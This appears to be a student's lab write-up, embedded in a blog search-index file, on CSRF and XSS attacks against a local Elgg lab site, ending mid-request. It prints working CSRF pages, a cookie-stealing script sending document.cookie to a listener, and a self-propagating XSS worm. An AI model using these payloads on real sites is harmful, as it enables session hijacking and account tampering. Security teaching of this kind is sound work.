<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HUST Information System Security Lab3-Web Security</title>
      <link href="/2024/09/26/HUST%20Information%20System%20Security%20Lab3-Web%20Security/"/>
      <url>/2024/09/26/HUST%20Information%20System%20Security%20Lab3-Web%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="Information-System-Security-Lab3-Record"><a href="#Information-System-Security-Lab3-Record" class="headerlink" title="Information System Security Lab3 Record"></a>Information System Security Lab3 Record</h1><h2 id="Cross-Site-Request-Forgery-CSRF-Attack-Experiment"><a href="#Cross-Site-Request-Forgery-CSRF-Attack-Experiment" class="headerlink" title="Cross-Site Request Forgery (CSRF) Attack Experiment"></a><strong>Cross-Site Request Forgery (CSRF) Attack Experiment</strong></h2><h3 id="Task-1-CSRF-Attack-Based-on-GET-Request"><a href="#Task-1-CSRF-Attack-Based-on-GET-Request" class="headerlink" title="Task 1: CSRF Attack Based on GET Request"></a><strong>Task 1: CSRF Attack Based on GET Request</strong></h3><p>Use samy to log in, send add friend command, get url. HTTP Header Live plugin window captured the packet as shown in the figure:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619220223319.png" alt="image-20240619220223319"></p><p>Thus we can know the GET request structure is <a href="http://www.csrflabelgg.com/action/friends/add?friend=id">http://www.csrflabelgg.com/action/friends/add?friend=id</a>, so now we need to get Samy’s ID number. We can see the red highlighted part 45 is Samy’s ID by trying to create a new interface for Samy.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619221713999.png" alt="image-20240619221713999"></p><p>Create get_csrf.html under Attacker site</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/get_csrf.html</span><br></pre></td></tr></table></figure><p>Write the following content</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Alice, you&#x27;re my friend now!</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=45&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>Samy sends Alice an email, inducing Alice to click the malicious link <a href="http://www.csrflabattacker.com/get_csrf.html">http://www.csrflabattacker.com/get_csrf.html</a></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224208937.png" alt="image-20240619224208937"></p><p>Log in to Alice’s account to view the email and access the malicious webpage, captured the GET request packet adding user id 45, which is Samy, then check the Activity interface and found that Alice added Samy as a friend.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224651139.png" alt="image-20240619224651139"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224818367.png" alt="image-20240619224818367"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224859567.png" alt="image-20240619224859567"></p><h3 id="Task-2-CSRF-Attack-Using-POST-Request"><a href="#Task-2-CSRF-Attack-Using-POST-Request" class="headerlink" title="Task 2: CSRF Attack Using POST Request"></a><strong>Task 2: CSRF Attack Using POST Request</strong></h3><p>Still log in to Samy’s account first, then modify the personal homepage below, perform POST request packet capture, and get the following results.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619230611400.png" alt="image-20240619230611400"></p><p>POST request sent to <a href="http://www.csrflabelgg.com/action/profile/edit">http://www.csrflabelgg.com/action/profile/edit</a>, the submitted form content is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=2G9AraT4cb7pPqONMfz3sQ</span><br><span class="line">&amp;__elgg_ts=<span class="number">1718837884</span></span><br><span class="line">&amp;name=Samy</span><br><span class="line">&amp;description=&lt;p&gt;A Hacker&lt;/p&gt;</span><br><span class="line">&amp;accesslevel[description]=<span class="number">2</span></span><br><span class="line">&amp;briefdescription=Student</span><br><span class="line">&amp;accesslevel[briefdescription]=<span class="number">2</span></span><br><span class="line">&amp;location=Wuhan</span><br><span class="line">&amp;accesslevel[location]=<span class="number">2</span></span><br><span class="line">&amp;interests=Football</span><br><span class="line">&amp;accesslevel[interests]=<span class="number">2</span></span><br><span class="line">&amp;skills=python</span><br><span class="line">&amp;accesslevel[skills]=<span class="number">2</span></span><br><span class="line">&amp;contactemail=U202112149@hust.edu.cn</span><br><span class="line">&amp;accesslevel[contactemail]=<span class="number">2</span></span><br><span class="line">&amp;phone=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[phone]=<span class="number">2</span></span><br><span class="line">&amp;mobile=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[mobile]=<span class="number">2</span></span><br><span class="line">&amp;website=https://strivelee.top</span><br><span class="line">&amp;accesslevel[website]=<span class="number">2</span></span><br><span class="line">&amp;twitter=lixiang21</span><br><span class="line">&amp;accesslevel[twitter]=<span class="number">2</span></span><br><span class="line">&amp;guid=<span class="number">45</span></span><br></pre></td></tr></table></figure><p>Based on this request format, Alice’s guid is known to be 43, try to use POST request for CSRF attack.</p><p>First create get_csrf.html under Attacker site</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure><p>Write the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, your profile has changed!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">guid</span>:<span class="number">42</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">description</span>:<span class="string">&quot;&lt;p&gt;Samy is my hero&lt;/p&gt;&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">briefdescription</span>:<span class="string">&quot;I&#x27;m Samy&quot;</span>,   </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>Samy sends Alice an email, inducing Alice to click the malicious link <a href="http://www.csrflabattacker.com/post_csrf.html">http://www.csrflabattacker.com/post_csrf.html</a></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232506107.png" alt="image-20240619232506107"></p><p>Log in to Alice’s account, then view and click the link in the email.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232629475.png" alt="image-20240619232629475"></p><p>We can see that the About me section was successfully modified, and the POST request packet was captured, which is consistent with the phenomenon.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232821090.png" alt="image-20240619232821090"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620230509435.png" alt="image-20240620230509435"></p><h3 id="Task-3-Implement-Login-CSRF-Attack"><a href="#Task-3-Implement-Login-CSRF-Attack" class="headerlink" title="Task 3: Implement Login CSRF Attack"></a><strong>Task 3: Implement Login CSRF Attack</strong></h3><p>First capture the login request packet, the corresponding request method is POST, url is <a href="http://www.csrflabelgg.com/action/login">http://www.csrflabelgg.com/action/login</a>, the request form has username and password, both are plaintext.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620164209052.png" alt="image-20240620164209052"></p><p>Form data content is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=5ovl8du9mM-5V1rwIDhJsg</span><br><span class="line">__elgg_ts=<span class="number">1718872774</span></span><br><span class="line">username=Samy</span><br><span class="line">password=seedsamy</span><br></pre></td></tr></table></figure><p>First create get_csrf.html under Attacker site</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure><p>Write the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, here is a CSRF_Login attack!  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Send POST request  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Carry cookie  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/login&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">       <span class="comment">// Pass parameters  </span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">username</span>:<span class="string">&quot;samy&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">password</span>:<span class="string">&quot;seedsamy&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persistent</span>:<span class="literal">true</span>,    </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>Samy sends Alice an email, inducing Alice to click the malicious link <a href="http://www.csrflabattacker.com/login_csrf.html">http://www.csrflabattacker.com/login_csrf.html</a></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620222327448.png" alt="image-20240620222327448"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223041289.png" alt="image-20240620223041289"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620223149485.png" alt="image-20240620223149485"></p><h3 id="Task-4-Defense-Strategy"><a href="#Task-4-Defense-Strategy" class="headerlink" title="Task 4: Defense Strategy"></a><strong>Task 4: Defense Strategy</strong></h3><p>First enter the directory &#x2F;var&#x2F;www&#x2F;CSRF&#x2F;Elgg&#x2F;vendor&#x2F;elgg&#x2F;elgg&#x2F;engine&#x2F;classes&#x2F;Elgg, find the function gatekeeper() in ActionService.php file and comment out the return true statement</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620231737340.png" alt="image-20240620231737340"></p><p>All 3 attacks failed:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232609700.png" alt="image-20240620232609700"></p><p>GET request has no token:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232620176.png" alt="image-20240620232620176"></p><p>POST request has no token:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232830171.png" alt="image-20240620232830171"></p><p>Login has no token:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232359807.png" alt="image-20240620232359807"></p><h2 id="Cross-Site-Scripting-XSS-Attack-Experiment"><a href="#Cross-Site-Scripting-XSS-Attack-Experiment" class="headerlink" title="Cross-Site Scripting (XSS) Attack Experiment"></a><strong>Cross-Site Scripting (XSS) Attack Experiment</strong></h2><p>First need to switch websites, switch to <a href="http://www.xsslabelgg.com/">http://www.xsslabelgg.com</a>.</p><h3 id="Task-1-Steal-Cookie-from-Victim’s-Machine"><a href="#Task-1-Steal-Cookie-from-Victim’s-Machine" class="headerlink" title="Task 1: Steal Cookie from Victim’s Machine"></a><strong>Task 1: Steal Cookie from Victim’s Machine</strong></h3><p>Use samy to log in, modify samy’s profile. In the About me field, first click Edit HTML, add the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=http://127.0.0.1:5555?c=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) +  <span class="string">&#x27;&gt;&#x27;</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102354596.png" alt="image-20240621102354596"></p><p>Switch to Alice and view Samy’s homepage, use nc to listen on port 5555 <code>nc -l 5555 -v</code> to view packet information, HTTP Header Live also works.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102835358.png" alt="image-20240621102835358"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621103053599.png" alt="image-20240621103053599"></p><h3 id="Task-2-Use-Ajax-Script-to-Automatically-Initiate-Session-Hijacking"><a href="#Task-2-Use-Ajax-Script-to-Automatically-Initiate-Session-Hijacking" class="headerlink" title="Task 2: Use Ajax Script to Automatically Initiate Session Hijacking"></a><strong>Task 2: Use Ajax Script to Automatically Initiate Session Hijacking</strong></h3><p>Use samy to log in, modify samy’s profile. In the About me field, first click Edit HTML, add the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>Then, switch to using Alice to log in, open Samy’s homepage from Alice’s interface to view. Through the HTTP Header Live plugin, it was found that a POST request to modify brief description has been sent out, achieving the attack effect. The sent HTTP packet:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621104726870.png" alt="image-20240621104726870"></p><h3 id="Task-3-Construct-XSS-Worm"><a href="#Task-3-Construct-XSS-Worm" class="headerlink" title="Task 3: Construct XSS Worm"></a><strong>Task 3: Construct XSS Worm</strong></h3><p>Use samy to log in, modify samy’s profile. In the About me field, first click Edit HTML, add the following content:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&#x27;worm&#x27;</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">description</span>: <span class="string">&quot;&lt;script id=&#x27;worm&#x27;&gt;&quot;</span> + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;worm&#x27;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;\/script&gt;&quot;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">3000</span>)  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>Then, switch to using Alice to log in, open Samy’s homepage from Alice’s interface to view. Through the HTTP Header Live plugin, it was found that a POST request to modify brief description has been sent out, achieving the attack effect. The sent HTTP packet:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621105412187.png" alt="image-20240621105412187"></p><p>Unlike the above, the description field of this POST packet was modified to the malicious XSS script itself, thus creating propagability. The specific content of the packet modifying Alice’s Profile is as follows.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621110705476.png" alt="image-20240621110705476"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http://www.xsslabelgg.com/action/profile/edit</span><br><span class="line">Host: www.xsslabelgg.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.xsslabelgg.com/profile/samy</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">origin: 